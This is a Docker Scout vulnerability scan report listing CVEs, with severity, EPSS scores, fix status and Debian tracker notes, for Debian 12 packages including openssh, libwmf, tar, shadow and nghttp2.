<a href="https://scout.docker.com/v/CVE-2020-15778?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A9.2p1-2%2Bdeb12u7"><img alt="low : CVE--2020--15778" src="https://img.shields.io/badge/CVE--2020--15778-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:9.2p1-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>61.479%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

scp in OpenSSH through 8.3p1 allows command injection in the scp.c toremote function, as demonstrated by backtick characters in the destination argument. NOTE: the vendor reportedly has stated that they intentionally omit validation of "anomalous argument transfers" because that could "stand a great chance of breaking existing workflows."

---
- openssh <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=1860487
https://github.com/cpandya2909/CVE-2020-15778
Negligible security impact, changing the scp protocol can have a good chance
of breaking existing workflows.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-14145?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A9.2p1-2%2Bdeb12u7"><img alt="low : CVE--2020--14145" src="https://img.shields.io/badge/CVE--2020--14145-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:9.2p1-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.254%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The client side in OpenSSH 5.7 through 8.4 has an Observable Discrepancy leading to an information leak in the algorithm negotiation. This allows man-in-the-middle attackers to target initial connection attempts (where no host key for the server has been cached by the client). NOTE: some reports state that 8.5 and 8.6 are also affected.

---
- openssh <unfixed> (unimportant)
https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-2-ausnutzung-eines-informationslecks-fuer-gezielte-mitm-angriffe-auf-ssh-clients/
https://www.fzi.de/fileadmin/user_upload/2020-06-26-FSA-2020-2.pdf
The OpenSSH project is not planning to change the behaviour of OpenSSH regarding
the issue, details in "3.1 OpenSSH" in the publication.
Partial mitigation: https://anongit.mindrot.org/openssh.git/commit/?id=b3855ff053f5078ec3d3c653cdaedefaa5fc362d (V_8_4_P1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-6110?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A9.2p1-2%2Bdeb12u7"><img alt="low : CVE--2019--6110" src="https://img.shields.io/badge/CVE--2019--6110-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:9.2p1-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>51.287%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In OpenSSH 7.9, due to accepting and displaying arbitrary stderr output from the server, a malicious server (or Man-in-The-Middle attacker) can manipulate the client output, for example to use ANSI control codes to hide additional files being transferred.

---
- openssh <unfixed> (unimportant)
https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt
Not considered a vulnerability by upstream, cf.
https://lists.mindrot.org/pipermail/openssh-unix-dev/2019-January/037475.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-15919?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A9.2p1-2%2Bdeb12u7"><img alt="low : CVE--2018--15919" src="https://img.shields.io/badge/CVE--2018--15919-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:9.2p1-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.073%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>84th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or "oracle") as a vulnerability.'

---
- openssh <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=907503)
https://www.openwall.com/lists/oss-security/2018/08/27/2
Not treated as a security issue by upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-20012?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A9.2p1-2%2Bdeb12u7"><img alt="low : CVE--2016--20012" src="https://img.shields.io/badge/CVE--2016--20012-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:9.2p1-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>14.603%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>94th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSH through 8.7 allows remote attackers, who have a suspicion that a certain combination of username and public key is known to an SSH server, to test whether this suspicion is correct. This occurs because a challenge is sent only when that combination could be valid for a login session. NOTE: the vendor does not recognize user enumeration as a vulnerability for this product

---
- openssh <unfixed> (unimportant)
https://github.com/openssh/openssh-portable/pull/270
Negligible impact, not treated as a security issue by upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2008-3234?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A9.2p1-2%2Bdeb12u7"><img alt="low : CVE--2008--3234" src="https://img.shields.io/badge/CVE--2008--3234-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:9.2p1-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.871%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

sshd in OpenSSH 4 on Debian GNU/Linux, and the 20070303 OpenSSH snapshot, allows remote authenticated users to obtain access to arbitrary SELinux roles by appending a :/ (colon slash) sequence, followed by the role name, to the username.

---
- openssh <unfixed> (unimportant)
this is by design

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2007-2768?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A9.2p1-2%2Bdeb12u7"><img alt="low : CVE--2007--2768" src="https://img.shields.io/badge/CVE--2007--2768-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:9.2p1-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.119%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSH, when using OPIE (One-Time Passwords in Everything) for PAM, allows remote attackers to determine the existence of certain user accounts, which displays a different response if the user account exists and is configured to use one-time passwords (OTP), a similar issue to CVE-2007-2243.

---
- openssh <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=436571; unimportant)
[etch] - openssh <no-dsa> (Minor issue)
[sarge] - openssh <no-dsa> (Minor issue)
http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=112279

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2007-2243?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A9.2p1-2%2Bdeb12u7"><img alt="low : CVE--2007--2243" src="https://img.shields.io/badge/CVE--2007--2243-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:9.2p1-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.463%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSH 4.6 and earlier, when ChallengeResponseAuthentication is enabled, allows remote attackers to determine the existence of user accounts by attempting to authenticate via S/KEY, which displays a different response if the user account exists, a similar issue to CVE-2001-1483.

---
- openssh <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=436571; unimportant)
[etch] - openssh <no-dsa> (Minor issue)
[sarge] - openssh <no-dsa> (Minor issue)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>libwmf</strong> <code>0.2.12-5.1</code> (deb)</summary>

<small><code>pkg:deb/debian/libwmf@0.2.12-5.1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2009-3546?s=debian&n=libwmf&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.2.12-5.1"><img alt="medium : CVE--2009--3546" src="https://img.shields.io/badge/CVE--2009--3546-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.2.12-5.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>4.125%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The _gdGetColors function in gd_gd.c in PHP 5.2.11 and 5.3.x before 5.3.1, and the GD Graphics Library 2.x, does not properly verify a certain colorsTotal structure member, which might allow remote attackers to conduct buffer overflow or buffer over-read attacks via a crafted GD file, a different vulnerability than CVE-2009-3293. NOTE: some of these details are obtained from third party information.

---
- libwmf <unfixed> (unimportant)
- racket 5.0.2-1 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=601525)
Only present in one of the sample pl-scheme packages (plot)
- libgd2 2.0.36~rc1~dfsg-3.1 (medium; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=552534)
- php5 <not-affected> (the php packages use the system libgd2)
http://svn.php.net/viewvc?view=revision&revision=289557
<20091015173822.084de220@redhat.com> in OSS-sec

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2007-3996?s=debian&n=libwmf&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.2.12-5.1"><img alt="medium : CVE--2007--3996" src="https://img.shields.io/badge/CVE--2007--3996-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.2.12-5.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>9.573%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>93rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Multiple integer overflows in libgd in PHP before 5.2.4 allow remote attackers to cause a denial of service (application crash) and possibly execute arbitrary code via a large (1) srcW or (2) srcH value to the (a) gdImageCopyResized function, or a large (3) sy (height) or (4) sx (width) value to the (b) gdImageCreate or the (c) gdImageCreateTrueColor function.

---
- libgd2 2.0.35.dfsg-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=443456; medium)
- libwmf <unfixed> (unimportant)
- racket 5.0.2-1 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=601525)
Only present in one of the sample pl-scheme packages (plot)
Debian's PHP packages are linked dynamically against libgd
see http://www.php.net/releases/5_2_4.php

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2007-3477?s=debian&n=libwmf&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.2.12-5.1"><img alt="low : CVE--2007--3477" src="https://img.shields.io/badge/CVE--2007--3477-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.2.12-5.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>7.352%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The (a) imagearc and (b) imagefilledarc functions in GD Graphics Library (libgd) before 2.0.35 allow attackers to cause a denial of service (CPU consumption) via a large (1) start or (2) end angle degree value.

---
- libgd2 2.0.35.dfsg-1 (low)
- libwmf <unfixed> (unimportant)
- racket 5.0.2-1 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=601525)
Only present in one of the sample pl-scheme packages (plot)
CPU consumption DoS

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2007-3476?s=debian&n=libwmf&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.2.12-5.1"><img alt="low : CVE--2007--3476" src="https://img.shields.io/badge/CVE--2007--3476-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.2.12-5.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>5.123%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>90th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Array index error in gd_gif_in.c in the GD Graphics Library (libgd) before 2.0.35 allows user-assisted remote attackers to cause a denial of service (crash and heap corruption) via large color index values in crafted image data, which results in a segmentation fault.

---
- libgd2 2.0.35.dfsg-1 (low)
- libwmf <unfixed> (unimportant)
- racket 5.0.2-1 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=601525)
Only present in one of the sample pl-scheme packages (plot)
can write a 0 to a 4k window in heap, very unlikely to be controllable.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>tar</strong> <code>1.34+dfsg-1.2</code> (deb)</summary>

<small><code>pkg:deb/debian/tar@1.34%2Bdfsg-1.2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-39804?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.34%2Bdfsg-1.2%2Bdeb12u1"><img alt="medium : CVE--2023--39804" src="https://img.shields.io/badge/CVE--2023--39804-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.34+dfsg-1.2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.34+dfsg-1.2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.067%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GNU tar before 1.35, mishandled extension attributes in a PAX archive can lead to an application crash in xheader.c.

---
- tar 1.34+dfsg-1.3 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1058079)
[bookworm] - tar 1.34+dfsg-1.2+deb12u1
[bullseye] - tar 1.34+dfsg-1+deb11u1
Fixed by: https://git.savannah.gnu.org/cgit/tar.git/commit/?id=a339f05cd269013fa133d2f148d73f6f7d4247e4 (v1.35)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-48303?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.34%2Bdfsg-1.2%2Bdeb12u1"><img alt="low : CVE--2022--48303" src="https://img.shields.io/badge/CVE--2022--48303-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.34+dfsg-1.2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.34+dfsg-1.2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.057%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Tar through 1.34 has a one-byte out-of-bounds read that results in use of uninitialized memory for a conditional jump. Exploitation to change the flow of control has not been demonstrated. The issue occurs in from_header in list.c via a V7 archive in which mtime has approximately 11 whitespace characters.

---
- tar 1.34+dfsg-1.4 (unimportant)
[bookworm] - tar 1.34+dfsg-1.2+deb12u1
[bullseye] - tar 1.34+dfsg-1+deb11u1
Crash in CLI tool, no security impact
https://savannah.gnu.org/bugs/?62387
https://savannah.gnu.org/patch/?10307
Fixed by: https://git.savannah.gnu.org/cgit/tar.git/commit/?id=3da78400eafcccb97e2f2fd4b227ea40d794ede8 (v1.35)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2005-2541?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.34%2Bdfsg-1.2%2Bdeb12u1"><img alt="low : CVE--2005--2541" src="https://img.shields.io/badge/CVE--2005--2541-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.34+dfsg-1.2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.806%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Tar 1.15.1 does not properly warn the user when extracting setuid or setgid files, which may allow local users or remote attackers to gain privileges.

---
This is intended behaviour, after all tar is an archiving tool and you
need to give -p as a command line flag
- tar <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=328228; unimportant)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>shadow</strong> <code>1:4.13+dfsg1-1</code> (deb)</summary>

<small><code>pkg:deb/debian/shadow@1%3A4.13%2Bdfsg1-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-4641?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A4.13%2Bdfsg1-1%2Bdeb12u1"><img alt="medium : CVE--2023--4641" src="https://img.shields.io/badge/CVE--2023--4641-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:4.13+dfsg1-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:4.13+dfsg1-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in shadow-utils. When asking for a new password, shadow-utils asks the password twice. If the password fails on the second attempt, shadow-utils fails in cleaning the buffer used to store the first entry. This may allow an attacker with enough access to retrieve the password from the memory.

---
- shadow 1:4.13+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1051062)
[bookworm] - shadow 1:4.13+dfsg1-1+deb12u1
[buster] - shadow <no-dsa> (Minor issue)
https://bugzilla.redhat.com/show_bug.cgi?id=2215945
https://github.com/shadow-maint/shadow/commit/65c88a43a23c2391dcc90c0abda3e839e9c57904 (4.14.0-rc1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-29383?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A4.13%2Bdfsg1-1%2Bdeb12u1"><img alt="low : CVE--2023--29383" src="https://img.shields.io/badge/CVE--2023--29383-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:4.13+dfsg1-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:4.13+dfsg1-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.034%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \r manipulations and Unicode characters to work around blocking of the : character make it possible to give the impression that a new user has been added. In other words, an adversary may be able to convince a system administrator to take the system offline (an indirect, social-engineered denial of service) by demonstrating that "cat /etc/passwd" shows a rogue user account.

---
- shadow 1:4.13+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1034482)
[bookworm] - shadow 1:4.13+dfsg1-1+deb12u1
[buster] - shadow <no-dsa> (Minor issue)
https://github.com/shadow-maint/shadow/pull/687
Fixed by: https://github.com/shadow-maint/shadow/commit/e5905c4b84d4fb90aefcd96ee618411ebfac663d (4.14.0-rc1)
Regression fix: https://github.com/shadow-maint/shadow/commit/2eaea70111f65b16d55998386e4ceb4273c19eb4 (4.14.0-rc1)
https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=31797
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2023-29383-abusing-linux-chfn-to-misrepresent-etc-passwd/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2007-5686?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A4.13%2Bdfsg1-1%2Bdeb12u2"><img alt="low : CVE--2007--5686" src="https://img.shields.io/badge/CVE--2007--5686-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:4.13+dfsg1-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.264%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.

---
- shadow <unfixed> (unimportant)
See #290803, on Debian LOG_UNKFAIL_ENAB in login.defs is set to no so
unknown usernames are not recorded on login failures

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>nghttp2</strong> <code>1.52.0-1</code> (deb)</summary>

<small><code>pkg:deb/debian/nghttp2@1.52.0-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-28182?s=debian&n=nghttp2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.52.0-1%2Bdeb12u2"><img alt="medium : CVE--2024--28182" src="https://img.shields.io/badge/CVE--2024--28182-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.52.0-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.52.0-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>24.971%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>96th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

nghttp2 is an implementation of the Hypertext Transfer Protocol version 2 in C. The nghttp2 library prior to version 1.61.0 keeps reading the unbounded number of HTTP/2 CONTINUATION frames even after a stream is reset to keep HPACK context in sync.  This causes excessive CPU usage to decode HPACK stream. nghttp2 v1.61.0 mitigates this vulnerability by limiting the number of CONTINUATION frames it accepts per stream. There is no workaround for this vulnerability.

---
- nghttp2 1.61.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068415)
[bookworm] - nghttp2 1.52.0-1+deb12u2
https://github.com/nghttp2/nghttp2/security/advisories/GHSA-x6x3-gv8h-m57q
https://www.kb.cert.org/vuls/id/421644
https://github.com/nghttp2/nghttp2/commit/00201ecd8f982da3b67d4f6868af72a1b03b14e0 (v1.61.0)
https://github.com/nghttp2/nghttp2/commit/d71a4668c6bead55805d18810d633fbb98315af9 (v1.61.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-44487?s=debian&n=nghttp2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.52.0-1%2Bdeb12u1"><img alt="low : CVE--2023--44487" src="https://img.shields.io/badge/CVE--2023--44487-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.52.0-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.52.0-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>94.466%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The HTTP/2 protocol allows a denial of service (server resource consumption) because request cancellation can reset many streams quickly, as exploited in the wild in August through October 2023.

---
- tomcat9 9.0.70-2
- tomcat10 10.1.14-1
- trafficserver 9.2.3+ds-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1053801; bug #1054427)
- grpc <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1074421)
[trixie] - grpc <no-dsa> (Minor issue)
[bookworm] - grpc <no-dsa> (Minor issue)
[bullseye] - grpc <no-dsa> (Minor issue)
[buster] - grpc <no-dsa> (Minor issue)
- h2o 2.2.5+dfsg2-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1054232)
[bookworm] - h2o <no-dsa> (Minor issue)
[bullseye] - h2o <postponed> (Minor issue, DoS)
- haproxy 1.8.13-1
- nginx 1.24.0-2 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1053770)
- nghttp2 1.57.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1053769)
- jetty9 9.4.53-1
- netty 1:4.1.48-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1054234)
- dnsdist 1.8.2-2
[bookworm] - dnsdist <end-of-life> (See #1119290)
[bullseye] - dnsdist <no-dsa> (Minor issue)
[buster] - dnsdist <not-affected> (HTTP/2 support was added later)
- varnish 7.5.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1056156)
[bookworm] - varnish <ignored> (Minor issue, too intrusive to backport)
[bullseye] - varnish <ignored> (Minor issue, too intrusive to backport)
Tomcat: https://github.com/apache/tomcat/commit/76bb4bfbfeae827dce896f650655bbf6e251ed49 (10.1.14)
Tomcat: https://github.com/apache/tomcat/commit/6d1a9fd6642387969e4410b9989c85856b74917a (9.0.81)
Starting with 9.0.70-2 Tomcat9 no longer ships the server stack, using that as the fixed version
ATS: https://lists.apache.org/thread/5py8h42mxfsn8l1wy6o41xwhsjlsd87q
ATS: https://github.com/apache/trafficserver/commit/b28ad74f117307e8de206f1de70c3fa716f90682 (9.2.3-rc0)
ATS: https://github.com/apache/trafficserver/commit/d742d74039aaa548dda0148ab4ba207906abc620 (8.1.9)
grpc: https://github.com/grpc/grpc/pull/34763
h2o: https://github.com/h2o/h2o/commit/28fe15117b909588bf14269a0e1c6ec4548579fe
dnsdist: h2o change breaks the ABI, hence dnsdist switched to a vendored fix in 1.8.2-2
haproxy: http://git.haproxy.org/?p=haproxy.git;a=commit;h=f210191dcdf32a2cb263c5bd22b7fc98698ce59a (v1.9-dev1)
haproxy: https://www.mail-archive.com/haproxy@formilux.org/msg44134.html
haproxy: https://www.mail-archive.com/haproxy@formilux.org/msg44136.html
nginx: https://mailman.nginx.org/pipermail/nginx-devel/2023-October/S36Q5HBXR7CAIMPLLPRSSSYR4PCMWILK.html
nginx: https://github.com/nginx/nginx/commit/6ceef192e7af1c507826ac38a2d43f08bf265fb9
nghttp2: https://github.com/nghttp2/nghttp2/pull/1961
nghttp2: https://github.com/nghttp2/nghttp2/security/advisories/GHSA-vx74-f528-fxqg
nghttp2: https://github.com/nghttp2/nghttp2/commit/72b4af6143681f528f1d237b21a9a7aee1738832 (v1.57.0)
jetty9: https://github.com/eclipse/jetty.project/issues/10679
jetty9: https://github.com/eclipse/jetty.project/releases/tag/jetty-9.4.53.v20231009
https://www.openwall.com/lists/oss-security/2023/10/10/6
https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/
Go uses CVE-2023-39325 to track this
netty: https://github.com/netty/netty/security/advisories/GHSA-xpw8-rcwv-8f8p
netty: https://github.com/netty/netty/commit/58f75f665aa81a8cbcf6ffa74820042a285c5e61 (netty-4.1.100.Final)
